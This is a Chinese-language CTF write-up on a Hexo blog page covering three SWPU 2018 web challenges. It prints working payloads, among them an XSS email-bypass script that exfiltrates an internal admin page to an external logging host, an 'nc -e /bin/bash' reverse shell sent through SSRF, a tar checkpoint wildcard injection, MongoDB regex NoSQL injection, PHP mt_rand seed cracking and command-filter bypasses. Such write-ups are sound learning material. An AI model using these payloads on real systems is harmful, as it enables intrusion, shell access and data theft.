@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>swpu第九届线上ctf | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！ 总结三道本次比赛的web题目。 1.有趣的邮箱注册首先打开页面。很正常的一个标准页面。没啥信息。  左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。 不允许外地访问。X-Forward-For:127.0.0.1 也不好使。这个时候应该是ssrf，但是并没有">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="swpu第九届线上ctf">
+<meta property="og:url" content="http://yoursite.com/2018/12/21/第九届swpuctf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！ 总结三道本次比赛的web题目。 1.有趣的邮箱注册首先打开页面。很正常的一个标准页面。没啥信息。  左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。 不允许外地访问。X-Forward-For:127.0.0.1 也不好使。这个时候应该是ssrf，但是并没有">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.imgur.com/cRAqWlV.png">
+<meta property="og:image" content="https://i.imgur.com/ZtQn4y5.png">
+<meta property="og:image" content="https://i.imgur.com/hzlmUbK.png">
+<meta property="og:image" content="https://i.imgur.com/SZ5ZWLP.png">
+<meta property="og:image" content="https://i.imgur.com/po9WELn.png">
+<meta property="og:image" content="https://i.imgur.com/QTD9hBm.png">
+<meta property="og:image" content="https://i.imgur.com/dsS92pt.png">
+<meta property="og:image" content="https://i.imgur.com/hqnMSul.png">
+<meta property="og:image" content="https://i.imgur.com/gHY8Fz5.png">
+<meta property="og:image" content="https://i.imgur.com/RJvSxR7.png">
+<meta property="og:updated_time" content="2018-12-24T14:06:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="swpu第九届线上ctf">
+<meta name="twitter:description" content="前言在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！ 总结三道本次比赛的web题目。 1.有趣的邮箱注册首先打开页面。很正常的一个标准页面。没啥信息。  左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。 不允许外地访问。X-Forward-For:127.0.0.1 也不好使。这个时候应该是ssrf，但是并没有">
+<meta name="twitter:image" content="https://i.imgur.com/cRAqWlV.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-第九届swpuctf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/21/第九届swpuctf/" class="article-date">
+  <time datetime="2018-12-20T16:00:00.000Z" itemprop="datePublished">2018-12-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      swpu第九届线上ctf
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！</p>
+<p>总结三道本次比赛的web题目。</p>
+<h1 id="1-有趣的邮箱注册"><a href="#1-有趣的邮箱注册" class="headerlink" title="1.有趣的邮箱注册"></a>1.有趣的邮箱注册</h1><p>首先打开页面。很正常的一个标准页面。没啥信息。</p>
+<p><img src="https://i.imgur.com/cRAqWlV.png" alt></p>
+<p>左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。</p>
+<p><img src="https://i.imgur.com/ZtQn4y5.png" alt><br>不允许外地访问。X-Forward-For:127.0.0.1 也不好使。<br>这个时候应该是ssrf，但是并没有ssrf的点。这时候考虑注册邮箱的时候会返回注册的邮箱，那么应该会有XSS。XSS加载脚本导致ssrf。<br><img src="https://i.imgur.com/hzlmUbK.png" alt></p>
+<p>但是有邮箱验证。需要绕过，<br>利用双引号绕过邮箱注册。如 </p>
+<pre><code>&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@qq.com。  </code></pre><p>可以看到出现了弹窗。  </p>
+<p>此时可以加载js脚本了。</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/admin.php&apos;, false);
+a.send(null);
+b = a.responseText;
+location.href = &apos;http://3jma2m.ceye.io/d?&apos; + escape(b);</code></pre><p>poc </p>
+<pre><code>&quot;&lt;script/src=http://47.106.xx.XX/11.js&gt;&lt;/script&gt;&quot;@qq.com</code></pre><p>这里js写在我的vps主机上，执行js之后，将页面返回的信息以url的形式去访问。这里我们使用<a href="http://ceye.io来接收访问信息。" target="_blank" rel="noopener">http://ceye.io来接收访问信息。</a></p>
+<p><img src="https://i.imgur.com/SZ5ZWLP.png" alt></p>
+<p>可以看到是个命令执行。</p>
+<p>然后我们继续构造ssrf来执行命令反弹shell</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888&apos;, false);
+a.send(null);
+b = a.responseText;
+location.href = &apos;http://3jma2m.ceye.io/d&apos; + escape(b);</code></pre><p>第二行注意反弹shell要编码</p>
+<pre><code>http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888</code></pre><p>本地vps 监听 nc -lvvp 8888</p>
+<p>此时我们可以看到反弹shell成功，</p>
+<p><img src="https://i.imgur.com/po9WELn.png" alt></p>
+<p>但是flag文件需要权限，而我们权限看不到。<br>此时寻找目录发现一个没见过的目录。</p>
+<p><img src="https://i.imgur.com/QTD9hBm.png" alt></p>
+<p>打开url <a href="http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/" target="_blank" rel="noopener">http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/</a></p>
+<p><img src="https://i.imgur.com/dsS92pt.png" alt></p>
+<p>看到上传和备份文件瞬间就想到了上传文件备份拿shell。但是这里发现上传php文件也可以，那很清楚问题不简单。上传之后找不到路径。经过一番思索，他确实不给路径你也找不到。此时，利用该刚刚的低权shell。查看一个可以看的文件 backup.php。</p>
+<pre><code>&lt;?php
+include(&quot;upload.php&quot;);
+echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
+$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);
+if(file_exists(&apos;z.tar.gz&apos;)){
+        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
+        echo &quot;备份文件名: z.tar.gz&quot;;
+}else{
+        echo &quot;未上传文件，无法备份！&quot;;
+}
+?&gt;</code></pre><p>所有东西都很正规。唯一有一句看着有点像有问题的样子。</p>
+<pre><code>$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);</code></pre><p>system 敏感函数。可能问题出在这里。然后就有了下面这篇文章，</p>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80943097</a></p>
+<p>读完之后发现这里会有一个命令执行。猜测。应该是需要用flag的身份来查看flag文件。也就是利用flag权限执行命令。</p>
+<p>poc为：</p>
+<p>上传三个文件。</p>
+<p>名字分别为。</p>
+<pre><code>6.sh
+--checkpoint-action=exec=sh 6
+--checkpoint=1</code></pre><p>然后备份文件。看上面那篇文章就可以了。重点在–。导致命令执行。<br>得到flag。</p>
+<p><img src="https://i.imgur.com/hqnMSul.png" alt><br>对我来说很喜欢这道题，学到了很多。</p>
+<h1 id="2-Injection"><a href="#2-Injection" class="headerlink" title="2.Injection ???"></a>2.Injection ???</h1><p>nosql注入。</p>
+<p>这道题相对比较简单。但是在我的知识盲区。还是记录下。</p>
+<p>打开就是个登陆框，弱口令万能密码注入，全都无效。题目给的名字是注入。试了半天，总不可能毫无人性的不是注入把。但是确实没弄出来，涉及到知识盲区了。nosql注入。不晓得的可以百度了解下，也就是对一些不适用于sql语句的数据库。我们需要用非sql语句来注入。</p>
+<p><img src="https://i.imgur.com/gHY8Fz5.png" alt></p>
+<p>查看页面源码有个提示。</p>
+<pre><code>&lt;!-- tips:info.php --&gt;</code></pre><p>查看phpinfo，显示拓展是mongodb数据库，那应该就是nosql注入了。参考文章链接：<a href="https://www.secpulse.com/archives/3278.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/3278.html</a></p>
+<p>简单说一下，也就是利用php的传递参数的松散性。我们可以传递数组。而因为mongodb数据库解析参数的特性，可以通过正则来采猜解账号密码。</p>
+<p>给出一组poc。<br><img src="https://i.imgur.com/RJvSxR7.png" alt><br>我们先匹配账号 所以密码 写为password[$regex]=1？<br>也就是匹配1一次或0次，不论如何都会为真。按照这个套路就可以匹配完账号。<br>账号为admin，所以匹配为真。如果username[$regex]=b，则会说账号密码错误。这样逐为爆破出账号密码登陆即可弹出flag。</p>
+<h1 id="3-用优惠码-买个-X-？"><a href="#3-用优惠码-买个-X-？" class="headerlink" title="3.用优惠码 买个 X ？"></a>3.用优惠码 买个 X ？</h1><p>本来想写flask那个python题，奈何没学过python开发，实在头疼。</p>
+<p>这道题涉及到php伪随机数，也是第一次遇到，学习一下。</p>
+<p>首先注册一个账号会给你一个十五位的邀请码，邀请码是随即种子生成的，利用邀请码来进行下一步的绕过。这里先说第一步，重点也是第一波php伪随机数的爆破。</p>
+<p><a href="http://www.zip源码泄露。get源码" target="_blank" rel="noopener">www.zip源码泄露。get源码</a> 通读源码。.</p>
+<pre><code>&lt;?php
+//生成优惠码
+$_SESSION[&apos;seed&apos;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&apos;seed&apos;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&apos;&apos;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&apos;Auth&apos;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;</code></pre><p>不难发现，这是两端php，第一段是php伪随机数，第二个是下一步绕过。</p>
+<p>通读第一部分源码，从一串构造的字符串中选取字符来构造为15长度的随即码，其实并不随机。因为一旦你知道了mt_rand，那么这串数字还是随机的吗，显然并不是，为什么说随机数并不随机，我们来进行下如下测试。</p>
+<pre><code>&lt;?php
+mt_srand(10);
+echo mt_rand();
+?&gt; </code></pre><p>自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p>简单的如上代码，其实进行播种10。你会发现打印出来mt_rand() 始终为502355954，也就是。在实际情况中不再需要mt_srand播种，上图简单测试下，种子确定的话，随机数也将是确定的。实际情况中mt_rand()即可产生随机数，种子范围为(0,999999999)，也就是会产生十亿个随机数，这个时候发现如果有这么一个爆破工具，那么随机数不再随机我们只需要爆破出种子即可。</p>
+<p>经过上面的解释，你现在是不是对随机数有些了解了。结合题目，只要我们知道种子，即可生成二十四位的优惠码，然后即可进行下一步操作。但是这咯需要提示的是，php不同版本随机数是不一样的，如7.0与7.2不一样，所以如果你要和题目中的php版本严格匹配才能爆破出正确的种子。</p>
+<p>推荐一款工具 php_mt_seed-4.0</p>
+<pre><code>&lt;?php
+$allowable_characters = &apos;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&apos;;
+$len = strlen($allowable_characters) - 1;
+$pass = $argv[1];
+for ($i = 0; $i &lt; strlen($pass); $i++) {
+  $number = strpos($allowable_characters, $pass[$i]);
+  echo &quot;$number $number 0 $len  &quot;;
+}
+echo &quot;\n&quot;;
+?&gt;</code></pre><p>此题爆破脚本官方writeup上有，生成 交给 php_mt_seed-4.0即可，</p>
+<p>对于RCE绕过。</p>
+<p>if (preg_match(“/^\d+.\d+.\d+.\d+$/im”,$ip)){<br>重点在参数m。</p>
+<p>当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。<br>也就是说 ^和$会匹配 字符串中n之前和之后，也会匹配整个字符串的开始和结尾，但是只要匹配到一个就会返回正确</p>
+<p>绕过选择 [c]at [f][l][a][g]。linux中会匹配[]中任意一个字符，或者 选择转义 ca\t f\lag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/21/第九届swpuctf/" data-id="ck0l0oh9z0026py2i43dnmx9i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/12/25/php协议漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          php的协议漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/12/14/flask从0到无/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Flask从零到无</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
